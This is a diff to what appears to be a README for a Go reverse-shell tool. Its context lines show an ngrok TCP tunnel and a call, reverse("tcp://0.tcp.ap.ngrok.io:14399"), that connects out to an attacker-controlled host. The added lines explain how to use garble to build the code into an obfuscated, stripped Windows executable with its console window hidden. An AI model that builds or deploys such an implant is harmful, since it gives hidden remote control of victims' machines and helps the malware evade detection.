@@ -70,3 +70,12 @@ ngrok tcp 6666
     go reverse("tcp://0.tcp.ap.ngrok.io:14399") <--paste here
 	}
 ```
+## build obfuscate exe dengan garble
+download golang garble
+```bash
+go install mvdan.cc/garble@latest
+```
+build exe with obfuscate
+```bash
+%USERPROFILE%\go\bin\garble build -ldflags="-s -w -H=windowsgui" -o app_obfuscated.exe k0m1t3dc.go
+```
